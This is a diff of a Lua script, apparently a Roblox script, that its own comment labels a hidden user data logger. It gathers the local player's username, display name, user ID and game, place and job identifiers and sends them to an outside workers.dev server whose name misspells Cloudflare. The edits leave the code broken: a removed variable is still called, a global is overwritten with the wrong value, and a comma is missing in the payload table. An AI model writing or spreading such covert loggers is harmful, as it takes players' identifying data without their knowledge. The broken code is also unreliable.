@@ -1,4 +1,4 @@
--- hidden user data logger 
+--  user data sending to server (hidden)
 
 if _G.ScriptSendData then
     return
@@ -22,12 +22,12 @@ end
 local SERVER_URL = "https://cloudfare-chat-server.sam00441.workers.dev"
 
 local gameId = game.GameId
-local gameTime = os.time
-local placeId = game.PlaceId
-local jobId = game.JobId
+_G.GameTime = os.time
+_G.PlaceId = game.PlaceId
+_G.JobId = game.JobId
 local GameIdTime = tostring(gameTime()) .. ":" .. tostring(gameId)
-_G.GameIdTime = GameIdTime 
-_G.GameId = gameId 
+_G.GameId = GameIdTime 
+
 
 local username = LocalPlayer.Name
 local displayName = LocalPlayer.DisplayName
@@ -40,9 +40,9 @@ local payloadObj = {
     displayName = displayName,
     userId = userId,
     gameId = gameId
-    time = _G.GameIdTime,
-    placeId = _G.PlaceID,
-    jobId = jobId,
+    time = _G.GameId,
+    placeId = _G.PlaceId,
+    jobId = _G.JobId,
     source = "roblox"
 }
 
